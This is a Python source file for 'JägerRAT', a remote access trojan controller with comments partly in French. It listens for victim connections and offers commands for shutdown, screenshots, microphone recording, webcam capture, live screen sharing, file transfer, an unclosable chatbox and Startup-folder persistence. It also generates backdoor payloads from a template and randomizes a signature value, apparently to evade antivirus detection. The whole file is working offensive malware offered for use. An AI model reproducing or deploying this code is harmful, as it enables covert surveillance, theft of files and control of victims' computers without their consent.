import socket
import subprocess
import time
import os
import threading
import sys
import json
import random
import termcolor
import tkinter

host = "127.0.0.1"
port = 4444
filename = "payload"

client = None

nbbits = 1024

chatBoxOpen = False


def accept_connections():
    
    try:
        c,addr = sock.accept()
        print("[+]Connection from "+str(addr))
        print("[+]Successful : Session open")
        return c
    except:
        print("[+]Failed to connect : abording...")

    
def send(target, data):
    ndata = json.dumps(data)
    ndata = bytes(ndata,"utf-8")
    target.send(ndata)

def receive(client,refresh=3):
    client.settimeout(refresh)
    data = ''
    while True:
        try:
            
            dataStr = client.recv(nbbits).decode().rstrip()
            
            data = data + json.loads(dataStr)
            #Traitement pour mise en forme
            data = data.replace(r'\n', '\n')
            data = data.replace(r'\r', '\r')
            data = data.replace(r'\\','\\')
            #traitement pour accent : é
            data = data.replace("\\x82","é")
            data = data.replace("\\x8a","è")

            client.settimeout(None)
            
            return data
        except ValueError:
            print("value error")
            continue
        except socket.timeout as e:
            client.settimeout(None)
            return "[+]erreur lors de la reception de données(timeout), essayer d'augmenter le nombre de bits reçus : !datasize <newsize>"

def changeNbBits(new):
    global nbbits
    nbbits = new


def communication(client):
    while True:
        
        command = input('$ ')
       
        try:
            split = command.split(" ")

            if(command == "" or command.replace(" ","") == ""): #si il n'y a pas de commande
                continue

            elif(split[0] == "!help"):
                print('''\n
                !exit                              --> Quit and destroy Session With The Target
                !clear                             --> Clear The Screen
                !shutdown                          --> Shutdown Victims computer
                !screenshot                        --> Takes screenshot and saves to the same directory
                !cd <Directory Name>               --> Changes Directory On Target System
                !upload <file name>                --> Upload File(of attacker computer)To The target Machine
                !download <file name>              --> Download File From Target Machine
                !record_mic <duration (sec)>       --> Record the mic and download in a .wav file
                !play <filename.wav>               --> Play the sound file on the victim's computer   
                !webcam_snap                       --> Picture from the WebCam
                !chatbox                           --> Open a ChatBox with the victim (window not closable for victim)
                !persist                           --> try persistence : cp exe in \%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
                !screenshare <time btw frames (sec)--> screenshare live

                (++ NOT IMPLEMENTED ++)
                keylog_start                      --> Start The Keylogger
                keylog_dump                       --> Print Keystrokes That The Target Inputted
                keylog_stop                       --> Stop And Self Destruct Keylogger File
                persistence *RegName* *fileName*  --> Create Persistence In Registry''')
            
            elif(split[0] == "!exit"):#disconnect
                send(client, command)
                print("[+]disconnected.")
                client.close()
                break

            elif(split[0] == "!clear"):
                os.system("clear")

            elif(split[0] == "!shutdown"):
                send(client,"shutdown /s /t 1")

            elif(split[0] == "!datasize"):#change directory
                if(len(split)!=2):#gestion erreur
                    print("[+]syntaxe incorrecte : !datasize <nbBits>")
                else:
                    changeNbBits(int(split[1]))
                
            
            elif(split[0] == "!cd"):#change directory
                if(len(split)!=2):#gestion erreur
                    print("[+]syntaxe incorrecte : !cd <chemin>")
                else:
                    send(client, command)
                    rec = receive(client)
                    print(rec)

            elif(split[0] == "!download"):#telprint("xx")echarger un fichier du le client
                
                if(len(split)!=2):#gestion erreur
                    print("[+]syntaxe incorrecte : !download <filepath>")
                else:
                    send(client, command)
                    download(client,split[1])

            elif(split[0] == "!upload"):#change directory
                if(len(split)!=2):#gestion erreur
                    print("[+]syntaxe incorrecte : !upload <filepath>")
                else:
                    send(client, command)
                    time.sleep(1) #laisser du temps entre la reception de la commande et du fichier pour pas confondre les deux
                    upload(client,split[1])
                

            elif(split[0] == "!screenshot"):#change directory
                
                send(client, command)
                download(client,"png")#telechargement du screen

            elif(split[0] == "!record_mic"):
                if(len(split)!=2):#gestion erreur
                    print("[+]syntaxe incorrecte : !record_mic <record_time>")
                else:
                    print("[+]recording...")
                    send(client, command)
                    download(client,"wav",int(split[1])+2)#telechargement du record

            elif(split[0] == "!play"):
                if(len(split)!=2):#gestion erreur
                    print("[+]syntaxe incorrecte : !play <audio_file>")
                else:
                    print("[+]playing...")
                    send(client, command)
                    time.sleep(1) #laisser du temps entre la reception de la commande et du fichier pour pas confondre les deux
                    upload(client,split[1])

            elif(split[0] == "!webcam_snap"):
                send(client,command)
                download(client,"jpg")

            elif(split[0] == "!chatbox"):
                send(client,command)
                #open a chatbox
                chatbox()
                #threading.Thread(target=chatbox,args=()).start()

            elif(split[0] == "!persist"):
                send(client,command)
                print("[+]running persistence")


            elif(split[0] == "!keylog_start"):##dont work : av detect
                print("[+]keylogger started.")
                send(client,command)

            elif(split[0] == "!screenshare"):
                if(len(split)!=2):#gestion erreur
                    print("[+]syntaxe incorrecte : !screenshare <time btw frames(sec)>")
                else:
                    print("[+]screenshare starting...")
                    send(client,command)
                    screenshare(split[1])
                    

            else:
                
                send(client, command)
                rec = receive(client)
                print(rec)
            #threading.Thread(target=receive,args=(target)).start()
        except:
            print("[+]erreur de type non detecté dans la commande...")
            continue

        

def download(client,ext,timeout=3,indiceName=0):
    name=ext
    if(ext == "png"):

        randomName = str(random.randint(99,99999999))+'.png'
        name=randomName

    if(ext == "wav"):

        randomName = str(random.randint(99,99999999))+'.wav'
        name=randomName
    
    if(ext == "jpg"):

        randomName = str(random.randint(99,99999999))+'.jpg'
        name=randomName

    if(ext == "screenshare"):
        name = "screenshareimg#"+str(indiceName)+".png"

    f = open(name,"wb")
    client.settimeout(timeout)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break

    client.settimeout(None)
    f.close()
    if(ext == "screenshare"):
        return name #pour pouvoir le supprimer ensuite
    else:
        print("[+]finished, file saved as: "+name)

def upload(client,file):
    f = open(file, 'rb')
    client.send(f.read())



def chatbox():
    global chatBoxOpen
    chatBoxOpen= True

    root = tkinter.Tk()
    root.title("ChatBox")

    BG_GRAY = "#ABB2B9"
    BG_COLOR = "#17202A"
    TEXT_COLOR = "#EAECEE"

    FONT = "Helvetica 14"
    FONT_BOLD = "Helvetica 13 bold"

    def listen_messages():
        while True:
            if not chatBoxOpen: #stop receive
                break
            
            rec = receive(client,0.1)
            if(rec[:3] == "```"):
                rec = rec.replace("`","")
                recC = "User -> "+rec

                txt.insert(tkinter.END, "\n" + recC)
    

    def close():
       
        global chatBoxOpen
        #close for client and server
        print("[+]closing ChatBox")
        chatBoxOpen = False
        send(client,"```@@$$**@ù") #close message
        time.sleep(0.5)
        
        root.destroy()
        

    def envoie():
        mes1 = "```"+e.get()
        mes = "Admin -> " + e.get()
        #envoyer message à client
        
        send(client,mes1)
        txt.insert(tkinter.END, "\n" + mes)
        e.delete(0, tkinter.END)

    def waitMes():
        recC = listen_messages()
        txt.insert(tkinter.END, "\n" + recC)


    
    
    th.start()


    lable1 = tkinter.Label(root, bg=BG_COLOR, fg=TEXT_COLOR, text="ChatBox", font=FONT_BOLD, pady=10, width=20, height=1).grid(
        row=0)

    txt = tkinter.Text(root, bg=BG_COLOR, fg=TEXT_COLOR, font=FONT, width=60)
    txt.grid(row=1, column=0, columnspan=2)

    scrollbar = tkinter.Scrollbar(txt)
    scrollbar.place(relheight=1, relx=0.974)

    e = tkinter.Entry(root, bg="#2C3E50", fg=TEXT_COLOR, font=FONT, width=55)
    e.grid(row=2, column=0)

    mes = tkinter.Button(root, text="Send", font=FONT_BOLD, bg=BG_GRAY,
                  command=envoie).grid(row=2, column=1)

    root.protocol("WM_DELETE_WINDOW", close)

    root.mainloop()


def screenshare(fps):
    print("entrée")
    fps = float(fps)
    i=0
    while True:
        print("couvle")
        name = download(client,"screenshare",3,i)
        print("apres")
        time.sleep(fps)
        i+=1
        os.remove(name)





















def generatePythonFile():

    writer = open(filename+".py","w")
    with open("app/hackTemplate.py","r") as reader:
        while True:
            line = reader.readline()

            if not line:
                break

            writer.writelines([line])

            if("#####PARAM" in line):
                reader.readline()
                reader.readline()
                writer.writelines(["port = "+str(port)+"\n","host = '"+host+"'\n"])
            
            if("#####SIGNATURE" in line):
                writer.writelines(["ChangeSignature = "+str(random.randint(0,999999))+"\n"])

    writer.close()

def installPack(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except:
        try:
            print("[+]failed with first method, retrying")
            subprocess.check_call(["pip", "install", package])
        except:
            print("[+]failed installing "+package)

        

def generateExeFile():
    #check if libs are installed
    try:
        import pyautogui
    except:
        installPack("pyautogui")
    try:
        import pyaudio
    except:
        installPack("pyaudio")
    try:
        import playsound
    except:
        installPack("playsound")
    try:
        import mutagen
    except:
        installPack("mutagen")
    try:
        import pynput
    except:
        installPack("pynput")
    try:
        import cv2
    except:
        installPack("opencv-python")
    try:
        import Pillow
    except:
        installPack("Pillow")

    ###all libs installed

    #generate exe
    try:
        subprocess.check_call([sys.executable,"-m","pyinstaller", "-F","--clean","-w",filename+".py"])
    except:
        try:
            subprocess.check_call(["pyinstaller", "-F","--clean","-w",filename+".py"])
        except:
            installPack("pyinstaller")
            try:
                subprocess.check_call([sys.executable,"-m","pyinstaller", "-F","--clean","-w",filename+".py"])
            except:
                print("[+]error from pyinstaller")
    #subprocess.call(sys.executable+" -m pyInstaller -F --clean -w "+filename+".py")
    # except:
    #     print("[+]error generating .exe file. Try checking installation of pyinstaller")




if  __name__ == "__main__":

    menu = True
    while(menu):

        print('''\n
        Welcome to JägerRAT

        Currents settings  : 
        
        LHOST = '''+host+'''
        LPORT = '''+str(port)+'''
        FILENAME = '''+filename+'''
        

        Choose an option  :

        1           --> Listen for a connection on currents settings 
        2           --> Generates a PYTHON backdoor with the currents settings
        3           --> (SOON) Generates a SHELL CODE with the currents settings 
        4           --> (SOON) Generates a EXE backdoor with the currents settings (need "pyinstaller" updated)
        5           --> Change the settings      
        0           --> QUIT                  


        ''')


        ans = int(input("$"))
        if(ans == 0):
            print("See you soon!")
            print("Closing JägerRAT...")
            menu=False
            ##todo close program

        elif(ans == 1):
            ##todo comme avant

            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #for socket already in use
            sock.bind((host,port))
            sock.listen(5)
            print("[+] Waiting for a connection on "+str(host)+":"+str(port)+"...")

            client = accept_connections()

            communication(client)


        elif(ans == 2):
            
            generatePythonFile()
            print("[+]backdoor created as: "+filename+".py")

        elif(ans == 3):
            print("[+]not yet implemented")
            pass
        elif(ans == 4):
            print("[+]not yet implemented")
            pass
            """
            generatePythonFile()
            time.sleep(0.5)
            generateExeFile()
            time.sleep(0.5)
            os.remove(filename+".py")
            """
        elif(ans == 5):
            settings = True
            while(settings):
                print('''\n

                Currents settings  : 
                
                LHOST = '''+host+'''
                LPORT = '''+str(port)+'''
                FILENAME = '''+filename+'''
                

                Choose an option  :

                1                     --> Change LHOST
                2                     --> Change LPORT
                3                     --> Change FILENAME    
                0                     --> BACK                  


            ''')
                rep = int(input("$"))
                if(rep == 0):
                    settings=False
                elif(rep == 1):
                    l=input("LHOST: ")
                    host = l
                    print("[+]updated")

                elif(rep == 2):
                    p=int(input("LPORT: "))
                    port = p
                    print("[+]updated")
                elif(rep == 3):
                    f=input("FILENAME: ")
                    filename = f
                    print("[+]updated")

    
    














"""
def receive_big(client):
    data=""
    client.settimeout(3)
    chunk = client.recv(1024).decode().rstrip()
    chunk = json.loads(chunk)
    while chunk:
        ddata=data+chunk
        try:
            chunk = client.recv(1024).decode().rstrip()
            chunk = json.loads(chunk)
        except socket.timeout as e:
            break
    client.settimeout(None)

    #Traitement pour mise en forme
    data = data.replace(r'\n', '\n')
    data = data.replace(r'\r', '\r')
    data = data.replace(r'\\','\\')
    #traitement pour accent : é
    data = data.replace("\\x82","é")
    data = data.replace("\\x8a","è")
    return data
"""